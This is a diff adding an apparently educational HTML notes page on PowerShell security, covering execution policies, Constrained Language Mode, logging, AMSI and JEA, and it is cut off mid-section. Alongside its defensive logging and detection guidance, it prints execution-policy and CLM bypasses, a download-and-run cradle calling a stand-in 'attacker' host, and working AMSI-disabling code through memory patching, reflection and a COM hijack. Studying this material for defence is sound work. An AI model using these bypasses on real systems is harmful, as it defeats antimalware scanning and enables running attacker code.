@@ -1,0 +1,2507 @@
+﻿<!DOCTYPE html>
+<html lang="en">
+<head>
+    <script>
+        (function() {
+        const base = document.createElement('base');
+        if(location.hostname.includes('github.io')){
+          base.href = `/HackBook/`;
+        }else{
+          const pathSegments = window.location.pathname.split('/').filter(element => element !== "");
+          const index = pathSegments.indexOf('HackBook');
+          pathSegments.splice(index + 1, pathSegments.length - (index + 1));
+          base.href = pathSegments.join('/') + '/';
+        }
+        document.head.appendChild(base);
+      })();
+    </script>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <link rel="icon" type="image/x-icon" href="assets/images/hacker.jpg">
+  <title>HackBook | PowerShell Security</title>
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet" />
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/prism.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/components/prism-powershell.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/components/prism-csharp.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/components/prism-bash.min.js"></script>
+  <link rel="stylesheet" href="https://unpkg.com/prism-themes@1.6.0/themes/prism-duotone-sea.css">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+  <script src="assets/scripts/main.js"></script>
+  <link rel="stylesheet" href="assets/styles/styles.css">
+</head>
+<body>
+  <div class="content">
+  <h1>PowerShell Security</h1>
+
+  <div class="tab-container">
+    <ul class="nav nav-tabs" role="tablist">
+      <li class="nav-item"><a class="nav-link active" data-bs-toggle="tab" href="#notes" role="tab">Notes</a></li>
+      <li class="nav-item"><a class="nav-link" data-bs-toggle="tab" href="#lab" role="tab">Lab</a></li>
+      <li class="nav-item"><a class="nav-link" data-bs-toggle="tab" href="#ctf" role="tab">CTF</a></li>
+    </ul>
+
+    <div class="tab-content">
+      <!-- ==================== NOTES TAB ==================== -->
+      <div class="tab-pane fade show active" id="notes" role="tabpanel">
+
+        <!-- EXECUTION POLICIES -->
+        <h2>Execution Policies</h2>
+        <p>Execution policies are <strong>NOT a security boundary</strong>. They are a safety feature to prevent accidental script execution. They can be trivially bypassed by any user with shell access.</p>
+
+        <h3>Policy Levels</h3>
+        <table class="table table-bordered table-dark">
+          <thead><tr><th>Policy</th><th>Behavior</th></tr></thead>
+          <tbody>
+            <tr><td><code>Restricted</code></td><td>Default on Windows clients. No scripts run. Interactive commands only.</td></tr>
+            <tr><td><code>AllSigned</code></td><td>All scripts (.ps1, .psm1, .psd1) must have a trusted digital signature. Prompts for untrusted publishers.</td></tr>
+            <tr><td><code>RemoteSigned</code></td><td>Default on Windows servers. Downloaded scripts require signature; local scripts run without signature.</td></tr>
+            <tr><td><code>Unrestricted</code></td><td>All scripts run. Warns before running downloaded scripts (Zone.Identifier ADS check).</td></tr>
+            <tr><td><code>Bypass</code></td><td>Nothing is blocked, no warnings or prompts. Designed for programmatic use.</td></tr>
+            <tr><td><code>Undefined</code></td><td>No policy set at current scope. If all scopes are Undefined, effective policy is Restricted.</td></tr>
+          </tbody>
+        </table>
+
+        <h3>Policy Scopes (Precedence Order)</h3>
+        <table class="table table-bordered table-dark">
+          <thead><tr><th>Scope</th><th>Configured Via</th><th>Precedence</th></tr></thead>
+          <tbody>
+            <tr><td><code>MachinePolicy</code></td><td>GPO (Computer Configuration)</td><td>Highest</td></tr>
+            <tr><td><code>UserPolicy</code></td><td>GPO (User Configuration)</td><td>2nd</td></tr>
+            <tr><td><code>Process</code></td><td>Environment variable / -ExecutionPolicy flag</td><td>3rd</td></tr>
+            <tr><td><code>CurrentUser</code></td><td>HKCU registry</td><td>4th</td></tr>
+            <tr><td><code>LocalMachine</code></td><td>HKLM registry</td><td>Lowest</td></tr>
+          </tbody>
+        </table>
+
+<pre><code class="language-powershell"># View all scopes and their policies
+Get-ExecutionPolicy -List
+
+# View effective policy
+Get-ExecutionPolicy
+
+# Set policy for current user
+Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy RemoteSigned</code></pre>
+
+        <h3>Bypass Techniques</h3>
+        <p>Since execution policy is not a security boundary, numerous bypass methods exist:</p>
+
+<pre><code class="language-powershell"># 1. Direct flag bypass
+powershell.exe -ExecutionPolicy Bypass -File script.ps1
+
+# 2. Pipe to PowerShell (no file written — bypasses RemoteSigned)
+Get-Content script.ps1 | powershell.exe -NoProfile -
+
+# 3. Read and execute via IEX
+IEX (Get-Content script.ps1 -Raw)
+
+# 4. Download and execute in memory (never touches disk)
+IEX (New-Object Net.WebClient).DownloadString('http://attacker/payload.ps1')
+
+# 5. Encoded command (Base64 UTF-16LE)
+$cmd = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes('Write-Host "bypassed"'))
+powershell.exe -EncodedCommand $cmd
+
+# 6. Alternate shell — pwsh (PowerShell 7) has separate policy
+pwsh.exe -ExecutionPolicy Bypass -File script.ps1
+
+# 7. Invoke through .NET directly
+[System.Management.Automation.PowerShell]::Create().AddScript('Write-Host "bypassed"').Invoke()
+
+# 8. Using Command switch (not a file, so no policy check)
+powershell.exe -Command "& { . .\script.ps1 }"
+
+# 9. Paste script directly into console (interactive — no policy)
+# 10. Use Invoke-Expression on string variable
+$code = Get-Content .\script.ps1 -Raw; Invoke-Expression $code
+
+# 11. Set via environment variable for child process
+$env:PSExecutionPolicyPreference = "Bypass"
+
+# 12. Use alternate hosts (ISE, custom host) — each has own policy
+powershell_ise.exe  # May have different policy</code></pre>
+
+        <div class="alert alert-warning">
+          <strong>Key Takeaway:</strong> If GPO sets MachinePolicy, you cannot override it with Set-ExecutionPolicy. However, the <code>-ExecutionPolicy</code> flag on powershell.exe sets the <em>Process</em> scope which still loses to MachinePolicy. In that case, use piping, encoding, or .NET invocation methods that don't trigger the policy check.
+        </div>
+
+        <!-- CONSTRAINED LANGUAGE MODE -->
+        <h2>Constrained Language Mode (CLM)</h2>
+        <p>CLM is a <strong>real security control</strong> (unlike execution policy). It restricts the PowerShell language to a safe subset, blocking dangerous operations while allowing basic scripting.</p>
+
+        <h3>What CLM Restricts</h3>
+        <table class="table table-bordered table-dark">
+          <thead><tr><th>Category</th><th>Restriction</th></tr></thead>
+          <tbody>
+            <tr><td>.NET Types</td><td>Only allowed types from a curated list. Blocks arbitrary [System.Runtime.InteropServices.Marshal], [System.Reflection.Assembly], etc.</td></tr>
+            <tr><td>COM Objects</td><td>All COM object creation blocked (New-Object -ComObject)</td></tr>
+            <tr><td>Win32 API</td><td>Add-Type with C#/VB using DllImport blocked entirely</td></tr>
+            <tr><td>Add-Type</td><td>Cannot compile arbitrary C#/VB/JScript code</td></tr>
+            <tr><td>Type Accelerators</td><td>Custom type accelerators not available</td></tr>
+            <tr><td>Script Blocks as Delegates</td><td>Cannot convert script blocks to .NET delegates</td></tr>
+            <tr><td>Dot-sourcing untrusted</td><td>Can only dot-source scripts that pass policy</td></tr>
+            <tr><td>DSC Resources</td><td>Class-based DSC resources blocked</td></tr>
+          </tbody>
+        </table>
+
+        <h3>Allowed in CLM</h3>
+        <ul>
+          <li>Core cmdlets (Get-Process, Get-Service, etc.)</li>
+          <li>Basic .NET types (strings, integers, arrays, hashtables)</li>
+          <li>Comparison/arithmetic operators</li>
+          <li>If/else, foreach, while, switch statements</li>
+          <li>Functions (without .NET type access)</li>
+          <li>Allowed types: [string], [int], [bool], [array], [hashtable], [psobject], [datetime], [timespan], [guid], [regex], [math]</li>
+        </ul>
+
+        <h3>How CLM is Enforced</h3>
+        <p>CLM is triggered by <strong>application control policies</strong>:</p>
+        <ul>
+          <li><strong>AppLocker</strong> — When a script rule policy exists (even Allow *), PowerShell enters CLM for unsigned/untrusted scripts</li>
+          <li><strong>WDAC (Windows Defender Application Control)</strong> — More robust. Scripts not in the policy get CLM. Preferred over AppLocker.</li>
+          <li><strong>System lockdown via __PSLockdownPolicy</strong> — Environment variable (legacy). If set to 4, forces CLM. Trivially bypassed by unsetting the variable (only in non-WDAC scenarios).</li>
+        </ul>
+
+<pre><code class="language-powershell"># Detect current language mode
+$ExecutionContext.SessionState.LanguageMode
+# Returns: FullLanguage, ConstrainedLanguage, RestrictedLanguage, or NoLanguage
+
+# Quick test — if this fails, you're in CLM
+[System.Runtime.InteropServices.Marshal]::PtrToStringAnsi([System.Runtime.InteropServices.Marshal]::SecureStringToBSTR((ConvertTo-SecureString "test" -AsPlainText -Force)))
+
+# Another test
+try { Add-Type -TypeDefinition 'public class Test {}'; "FullLanguage" } catch { "ConstrainedLanguage" }</code></pre>
+
+        <h3>CLM Bypass Techniques</h3>
+
+<pre><code class="language-powershell"># 1. PowerShell v2 downgrade (if .NET 2.0/3.5 still installed — no CLM in PSv2)
+powershell.exe -Version 2 -Command "Write-Host $ExecutionContext.SessionState.LanguageMode"
+# Check if available:
+Get-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2
+
+# 2. If __PSLockdownPolicy env var is the enforcement (NOT AppLocker/WDAC)
+# Simply unset it (only works in weak deployments)
+[Environment]::SetEnvironmentVariable('__PSLockdownPolicy', $null, 'Machine')
+
+# 3. Find writable locations trusted by AppLocker/WDAC
+# Default AppLocker rules trust C:\Windows\* — find writable subdirs
+$writable = @('C:\Windows\Tasks', 'C:\Windows\Temp', 'C:\Windows\tracing',
+              'C:\Windows\Registration\CRMLog', 'C:\Windows\System32\FxsTmp',
+              'C:\Windows\System32\com\dmp', 'C:\Windows\System32\spool\drivers\color')
+foreach ($path in $writable) {
+    if (Test-Path $path) { 
+        try { [IO.File]::WriteAllText("$path\test.txt", "writable"); Remove-Item "$path\test.txt"; $path } catch {}
+    }
+}
+# Place script in trusted writable location → runs in FullLanguage
+
+# 4. MSBuild inline task execution (runs C# outside PowerShell)
+# Create .csproj with inline C# task — MSBuild is trusted by default
+
+# 5. Custom runspace from allowed binary
+# If you can execute a .NET binary in a trusted path, create a PS runspace in FullLanguage
+
+# 6. InstallUtil / RegSvcs / RegAsm / MSBuild LOLBin execution
+# These .NET framework binaries can execute arbitrary C# without PowerShell restrictions</code></pre>
+
+        <h4>MSBuild CLM Escape Example</h4>
+<pre><code class="language-csharp">// Save as payload.csproj in a trusted writable location
+// Execute: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe payload.csproj
+&lt;Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003"&gt;
+  &lt;Target Name="Build"&gt;
+    &lt;ExecTask /&gt;
+  &lt;/Target&gt;
+  &lt;UsingTask TaskName="ExecTask" TaskFactory="CodeTaskFactory"
+    AssemblyFile="C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll"&gt;
+    &lt;Task&gt;
+      &lt;Code Type="Class" Language="cs"&gt;
+        using System;
+        using Microsoft.Build.Framework;
+        using Microsoft.Build.Utilities;
+        using System.Management.Automation;
+        using System.Management.Automation.Runspaces;
+        public class ExecTask : Task {
+          public override bool Execute() {
+            using (Runspace rs = RunspaceFactory.CreateRunspace()) {
+              rs.Open();
+              // This runspace runs in FullLanguage mode
+              PowerShell ps = PowerShell.Create();
+              ps.Runspace = rs;
+              ps.AddScript("whoami; $ExecutionContext.SessionState.LanguageMode");
+              foreach (var result in ps.Invoke()) { Console.WriteLine(result); }
+            }
+            return true;
+          }
+        }
+      &lt;/Code&gt;
+    &lt;/Task&gt;
+  &lt;/UsingTask&gt;
+&lt;/Project&gt;</code></pre>
+
+        <!-- LOGGING -->
+        <h2>PowerShell Logging</h2>
+        <p>PowerShell has three major logging mechanisms. All three should be enabled for proper security monitoring.</p>
+
+        <h3>Script Block Logging (Event ID 4104)</h3>
+        <p>Captures the <strong>deobfuscated</strong> script block text at execution time. This is the single most valuable PowerShell log — it shows what actually runs regardless of encoding/obfuscation layers.</p>
+
+        <table class="table table-bordered table-dark">
+          <thead><tr><th>Detail</th><th>Value</th></tr></thead>
+          <tbody>
+            <tr><td>Event Log</td><td>Microsoft-Windows-PowerShell/Operational</td></tr>
+            <tr><td>Event ID</td><td>4104 (script block), 4105 (start), 4106 (stop)</td></tr>
+            <tr><td>GPO Path</td><td>Computer Config → Admin Templates → Windows Components → Windows PowerShell → Turn on PowerShell Script Block Logging</td></tr>
+            <tr><td>Registry</td><td>HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging → EnableScriptBlockLogging = 1</td></tr>
+          </tbody>
+        </table>
+
+<pre><code class="language-powershell"># Enable Script Block Logging via registry
+New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Force
+Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -Value 1
+
+# Enable invocation logging (also logs start/stop — verbose)
+Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name "EnableScriptBlockInvocationLogging" -Value 1
+
+# Query script block logs
+Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational'; Id=4104} |
+  Select-Object TimeCreated, @{N='ScriptBlock';E={$_.Properties[2].Value}} | Format-List
+
+# Search for suspicious content in logs
+Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational'; Id=4104} |
+  Where-Object { $_.Message -match 'AmsiUtils|Invoke-Mimikatz|DownloadString|IEX|bypass' }</code></pre>
+
+        <h4>Deep Script Block Logging (Automatic Suspicious Detection)</h4>
+        <p>Even without GPO enabled, PowerShell automatically logs script blocks containing suspicious content (known attack patterns). This "suspicious" flag is set when the script contains:</p>
+        <ul>
+          <li>Known AMSI bypass patterns</li>
+          <li>Invoke-Expression with download cradles</li>
+          <li>Credential access patterns</li>
+          <li>Known tool signatures (Mimikatz, PowerView, etc.)</li>
+          <li>Encoding/obfuscation patterns</li>
+        </ul>
+
+        <h3>Module Logging (Event ID 4103)</h3>
+        <p>Logs pipeline execution details including parameter bindings, output, and command invocations. More verbose than Script Block Logging.</p>
+
+        <table class="table table-bordered table-dark">
+          <thead><tr><th>Detail</th><th>Value</th></tr></thead>
+          <tbody>
+            <tr><td>Event Log</td><td>Microsoft-Windows-PowerShell/Operational</td></tr>
+            <tr><td>Event ID</td><td>4103</td></tr>
+            <tr><td>GPO Path</td><td>Computer Config → Admin Templates → Windows Components → Windows PowerShell → Turn on Module Logging</td></tr>
+            <tr><td>Registry</td><td>HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging → EnableModuleLogging = 1</td></tr>
+          </tbody>
+        </table>
+
+<pre><code class="language-powershell"># Enable Module Logging for all modules
+New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging" -Force
+Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging" -Name "EnableModuleLogging" -Value 1
+New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging\ModuleNames" -Force
+Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging\ModuleNames" -Name "*" -Value "*"
+
+# Query module logs
+Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational'; Id=4103} |
+  Select-Object TimeCreated, Message -First 20</code></pre>
+
+        <h3>Transcription</h3>
+        <p>Records complete session input/output to a text file. Captures everything the user sees, including command output.</p>
+
+<pre><code class="language-powershell"># Enable via GPO: Computer Config → Admin Templates → Windows Components → 
+#   Windows PowerShell → Turn on PowerShell Transcription
+
+# Enable via registry
+New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription" -Force
+Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription" -Name "EnableTranscripting" -Value 1
+Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription" -Name "OutputDirectory" -Value "C:\PSTranscripts"
+Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription" -Name "EnableInvocationHeader" -Value 1
+
+# Manual transcription in session
+Start-Transcript -Path "C:\transcript.txt" -Append
+# ... do work ...
+Stop-Transcript
+
+# Transcript files contain:
+# - Timestamp, user, computer, PID
+# - Full command input and output
+# - Invocation headers (if enabled) — which command produced which output</code></pre>
+
+        <h3>Log Analysis Cheatsheet</h3>
+<pre><code class="language-powershell"># Find all PowerShell operational logs
+Get-WinEvent -ListLog *PowerShell* | Format-Table LogName, RecordCount
+
+# Correlate events by ScriptBlock ID (multi-part scripts)
+Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational'; Id=4104} |
+  Group-Object { $_.Properties[3].Value } |  # Group by ScriptBlockId
+  Where-Object { $_.Count -gt 1 }  # Multi-part script blocks
+
+# Timeline of PowerShell activity
+Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational'; 
+  StartTime=(Get-Date).AddHours(-24)} | 
+  Sort-Object TimeCreated |
+  Select-Object TimeCreated, Id, @{N='Preview';E={$_.Message.Substring(0,[Math]::Min(100,$_.Message.Length))}}
+
+# Export for analysis
+Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational'; Id=4104} |
+  Export-Csv -Path ".\ps_scriptblocks.csv" -NoTypeInformation</code></pre>
+
+        <!-- AMSI -->
+        <h2>AMSI (Antimalware Scan Interface)</h2>
+        <p>AMSI is a Windows API that allows applications to integrate with installed antimalware products. It provides a content-scanning interface that sits between script execution and the AV engine.</p>
+
+        <h3>Architecture</h3>
+        <p><code>amsi.dll</code> is loaded into every process that opts in:</p>
+        <ul>
+          <li>PowerShell (System.Management.Automation.dll loads AMSI)</li>
+          <li>VBScript / JScript (wscript.exe, cscript.exe)</li>
+          <li>.NET CLR (4.8+ loads amsi.dll for Assembly.Load)</li>
+          <li>Office VBA Macros</li>
+          <li>Windows Script Host</li>
+          <li>Any application calling AMSI APIs</li>
+        </ul>
+
+        <h3>AMSI Call Flow</h3>
+<pre><code class="language-powershell"># Pseudocode of AMSI flow in PowerShell:
+# 1. AmsiInitialize(appName, &amsiContext)     — creates context for "PowerShell_*.exe"
+# 2. AmsiOpenSession(amsiContext, &session)     — per-pipeline/script session
+# 3. AmsiScanBuffer(amsiContext, buffer, len, contentName, session, &result) — THE scan
+# 4. If result == AMSI_RESULT_DETECTED → block execution, throw error
+# 5. AmsiCloseSession(amsiContext, session)     — cleanup
+# 6. AmsiUninitialize(amsiContext)              — process exit</code></pre>
+
+        <h4>PowerShell Integration Detail</h4>
+        <p>In PowerShell, AMSI scans occur at the <strong>script block</strong> level:</p>
+        <ol>
+          <li>User enters command or script executes</li>
+          <li>PowerShell compiles script block (deobfuscates/expands)</li>
+          <li>Before execution, the <em>deobfuscated</em> text is sent to AmsiScanBuffer</li>
+          <li>Defender (or registered provider) evaluates the content</li>
+          <li>If malicious → <code>This script contains malicious content and has been blocked</code></li>
+        </ol>
+
+        <h4>Provider Registration</h4>
+<pre><code class="language-powershell"># AMSI providers register via COM under:
+# HKLM:\SOFTWARE\Microsoft\AMSI\Providers\{GUID}
+# Windows Defender's GUID: {2781761E-28E0-4109-99FE-B9D127C57AFE}
+
+# List registered AMSI providers
+Get-ChildItem "HKLM:\SOFTWARE\Microsoft\AMSI\Providers"
+
+# Each provider implements IAntimalwareProvider COM interface:
+# - Scan(IAmsiStream stream, out AMSI_RESULT result)
+# - CloseSession(ULONGLONG session)
+# - DisplayName { get; }</code></pre>
+
+        <h3>AMSI Bypass Techniques</h3>
+        <div class="alert alert-danger">
+          <strong>Warning:</strong> These techniques are documented for defensive understanding and CTF contexts. Use responsibly.
+        </div>
+
+        <h4>1. Memory Patching AmsiScanBuffer</h4>
+        <p>Overwrite the first bytes of AmsiScanBuffer with instructions that return AMSI_RESULT_CLEAN (0).</p>
+<pre><code class="language-powershell"># Classic AmsiScanBuffer patch — overwrites function prologue with:
+# mov eax, 0x80070057 (E_INVALIDARG) → ret
+# This makes every scan return "clean"
+
+$win32 = @"
+using System;
+using System.Runtime.InteropServices;
+public class Win32 {
+    [DllImport("kernel32")]
+    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+    [DllImport("kernel32")]
+    public static extern IntPtr LoadLibrary(string name);
+    [DllImport("kernel32")]
+    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+}
+"@
+
+Add-Type $win32
+$amsiDll = [Win32]::LoadLibrary("amsi.dll")
+$amsiScanBuffer = [Win32]::GetProcAddress($amsiDll, "AmsiScanBuffer")
+$p = 0
+[Win32]::VirtualProtect($amsiScanBuffer, [uint32]5, 0x40, [ref]$p)
+$patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)  # mov eax, 0x80070057; ret
+[System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $amsiScanBuffer, 6)</code></pre>
+
+        <h4>2. AmsiInitFailed Forced Flag</h4>
+<pre><code class="language-powershell"># Force the amsiInitFailed field to true via reflection
+# This makes PowerShell skip all AMSI calls
+
+$ref = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
+$field = $ref.GetField('amsiInitFailed','NonPublic,Static')
+$field.SetValue($null, $true)
+
+# Obfuscated variant to avoid AMSI catching the bypass itself:
+$a = [Ref].Assembly.GetType(('System.Management.Automation.{0}Utils' -f 'Amsi'))
+$b = $a.GetField(('amsi{0}Failed' -f 'Init'),'NonPublic,Static')
+$b.SetValue($null,$true)</code></pre>
+
+        <h4>3. Reflection-Based Context Nulling</h4>
+<pre><code class="language-powershell"># Null the amsiContext to make AmsiOpenSession fail gracefully
+$ctx = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiContext','NonPublic,Static')
+$ctx.SetValue($null, [IntPtr]::Zero)
+
+# Alternative: null the amsiSession
+$sess = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiSession','NonPublic,Static')
+$sess.SetValue($null, $null)</code></pre>
+
+        <h4>4. PowerShell v2 Downgrade</h4>
+<pre><code class="language-powershell"># PSv2 predates AMSI entirely — no amsi.dll loading
+powershell.exe -Version 2 -Command "IEX (New-Object Net.WebClient).DownloadString('http://attacker/payload.ps1')"
+# Requires .NET 2.0/3.5 to be installed (Windows feature)
+# Detection: Event ID 400 shows EngineVersion=2.0</code></pre>
+
+        <h4>5. COM Server Hijacking</h4>
+<pre><code class="language-powershell"># Hijack the AMSI COM server registration to point to a dummy DLL
+# that implements IAntimalwareProvider but always returns clean
+
+# Original: HKCR\CLSID\{fdb00e52-a214-4aa1-8fba-4357bb0072ec}\InProcServer32 → amsi.dll
+# Hijack: Set InProcServer32 to a benign DLL or empty path
+
+# Per-user hijack (HKCU takes precedence over HKLM for COM):
+New-Item -Path "HKCU:\Software\Classes\CLSID\{fdb00e52-a214-4aa1-8fba-4357bb0072ec}\InProcServer32" -Force
+Set-ItemProperty -Path "HKCU:\Software\Classes\CLSID\{fdb00e52-a214-4aa1-8fba-4357bb0072ec}\InProcServer32" -Name "(default)" -Value "C:\dummy\notamsi.dll"</code></pre>
+
+        <h4>6. String Obfuscation</h4>
+<pre><code class="language-powershell"># Break up signatures to avoid pattern matching
+# Instead of: Invoke-Mimikatz
+$a = 'Invoke-'; $b = 'Mimi'; $c = 'katz'; IEX ($a+$b+$c)
+
+# Character array concatenation
+$cmd = [char[]]@(73,110,118,111,107,101,45,77,105,109,105,107,97,116,122) -join ''
+
+# Environment variable storage
+$env:x = 'Invoke-Mimikatz'; IEX $env:x
+
+# XOR encode/decode
+$encoded = [byte[]]@(0x10,0x2F,0x3A,0x28,0x26,0x22,0x0C,0x14,0x2E,0x26,0x2E,0x26,0x26,0x20,0x35,0x3F)
+$key = 0x59
+$decoded = -join ($encoded | ForEach-Object { [char]($_ -bxor $key) })</code></pre>
+
+        <h4>7. CLR Hooking</h4>
+<pre><code class="language-csharp">// Hook AmsiScanBuffer at the CLR level using a managed hook
+// This requires injecting into the process or running as a custom host
+using System;
+using System.Runtime.InteropServices;
+
+public class AmsiBypass {
+    [DllImport("kernel32")]
+    static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
+    [DllImport("kernel32")]
+    static extern IntPtr GetModuleHandle(string lpModuleName);
+    [DllImport("kernel32")]
+    static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, 
+        uint flNewProtect, out uint lpflOldProtect);
+
+    public static void Patch() {
+        IntPtr amsi = GetModuleHandle("amsi.dll");
+        IntPtr asb = GetProcAddress(amsi, "AmsiScanBuffer");
+        uint oldProtect;
+        VirtualProtect(asb, (UIntPtr)8, 0x40, out oldProtect);
+        // xor rax, rax; ret (return 0 = AMSI_RESULT_CLEAN)
+        Marshal.Copy(new byte[] { 0x48, 0x31, 0xC0, 0xC3 }, 0, asb, 4);
+        VirtualProtect(asb, (UIntPtr)8, oldProtect, out oldProtect);
+    }
+}</code></pre>
+
+        <h4>8. .NET Assembly.Load Bypass</h4>
+<pre><code class="language-powershell"># In .NET 4.8+, Assembly.Load also triggers AMSI
+# Bypass: Load assembly from byte array after patching AMSI
+# Or: Use Assembly.UnsafeLoadFrom (may bypass in some versions)
+# Or: Load via AppDomain with evidence manipulation
+
+# Reflection to disable AMSI for .NET assembly loads:
+$a = [System.Runtime.InteropServices.RuntimeEnvironment]
+# ... varies by .NET version and patch level</code></pre>
+
+        <h3>AMSI Detection (Blue Team)</h3>
+<pre><code class="language-powershell"># Monitor for AMSI bypass indicators:
+# 1. Event 4104 containing: AmsiUtils, amsiInitFailed, AmsiScanBuffer, VirtualProtect
+# 2. ETW provider Microsoft-Antimalware-Scan-Interface shows scan results
+# 3. Defender logs show AMSI detections in Event Viewer → Applications and Services → Microsoft → Windows → Windows Defender → Operational
+
+# ETW tracing for AMSI
+logman create trace AMSITrace -p Microsoft-Antimalware-Scan-Interface -o amsi.etl -ets
+# ... trigger activity ...
+logman stop AMSITrace -ets</code></pre>
+
+        <!-- JEA -->
+        <h2>JEA (Just Enough Administration)</h2>
+        <p>JEA creates constrained PowerShell remoting endpoints that limit what connected users can do. It operates on a least-privilege model using role capabilities.</p>
+
+        <h3>Session Configuration File (.pssc)</h3>
+<pre><code class="language-powershell"># Create session configuration
+New-PSSessionConfigurationFile -Path .\JEAConfig.pssc -SessionType RestrictedRemoteServer `
+  -RunAsVirtualAccount `
+  -TranscriptDirectory "C:\ProgramData\JEA\Transcripts" `
+  -RoleDefinitions @{
+    'DOMAIN\HelpDesk' = @{ RoleCapabilities = 'HelpDeskOps' }
+    'DOMAIN\ServerAdmins' = @{ RoleCapabilities = 'ServerMaintenance' }
+  }
+
+# Key .pssc properties:
+# SessionType: RestrictedRemoteServer (locked down) or Default  
+# RunAsVirtualAccount: $true — commands run as a temporary local admin
+# RunAsVirtualAccountGroups: limit groups the virtual account belongs to
+# TranscriptDirectory: mandatory logging location
+# LanguageMode: defaults to NoLanguage for JEA (only visible commands work)
+# MountUserDrive: $true — gives user a PSDrive for file transfer</code></pre>
+
+        <h3>Role Capability File (.psrc)</h3>
+<pre><code class="language-powershell"># Create role capability
+New-PSRoleCapabilityFile -Path "C:\Program Files\WindowsPowerShell\Modules\JEARoles\RoleCapabilities\HelpDeskOps.psrc" `
+  -VisibleCmdlets @(
+    'Restart-Computer',
+    'Get-Service',
+    @{ Name = 'Restart-Service'; Parameters = @{ Name = 'Name'; ValidateSet = 'Spooler','W32Time' } },
+    'Get-Process'
+  ) `
+  -VisibleExternalCommands @('C:\Windows\System32\ipconfig.exe', 'C:\Windows\System32\whoami.exe') `
+  -VisibleFunctions @('Get-ServerInfo') `
+  -FunctionDefinitions @{
+    Name = 'Get-ServerInfo'
+    ScriptBlock = { Get-ComputerInfo | Select-Object CsName, OsName, OsVersion }
+  }
+
+# Key .psrc properties:
+# VisibleCmdlets: whitelist with optional parameter constraints
+# VisibleFunctions: custom functions available in session
+# VisibleExternalCommands: allowed .exe paths
+# VisibleAliases: allowed aliases
+# VisibleProviders: allowed PS providers (FileSystem, Registry, etc.)
+# ScriptsToProcess: scripts that run when session starts
+# FunctionDefinitions: inline function implementations</code></pre>
+
+        <h3>Registering JEA Endpoint</h3>
+<pre><code class="language-powershell"># Register the session configuration
+Register-PSSessionConfiguration -Name 'HelpDeskEndpoint' -Path .\JEAConfig.pssc -Force
+
+# Connect to JEA endpoint
+Enter-PSSession -ComputerName Server01 -ConfigurationName HelpDeskEndpoint
+
+# Or invoke commands
+Invoke-Command -ComputerName Server01 -ConfigurationName HelpDeskEndpoint -ScriptBlock {
+    Get-Service | Where-Object Status -eq 'Running'
+}
+
+# List available commands in JEA session
+Get-Command  # Only shows visible cmdlets/functions</code></pre>
+
+        <h3>JEA Attack Surface</h3>
+<pre><code class="language-powershell"># Common JEA misconfigurations:
+
+# 1. Overly broad VisibleCmdlets — wildcard parameters
+# BAD: Allows all parameters on Restart-Service (including -InputObject pipeline manipulation)
+@{ Name = 'Restart-Service'; Parameters = @{} }
+
+# 2. VisibleExternalCommands with writable paths
+# If attacker can replace the .exe, they run arbitrary code as virtual account
+'C:\Tools\CustomTool.exe'  # If C:\Tools is writable...
+
+# 3. Unrestricted providers
+# FileSystem provider + virtual account = read/write any file as local admin
+VisibleProviders = @('FileSystem')  
+
+# 4. Functions with injection vulnerabilities
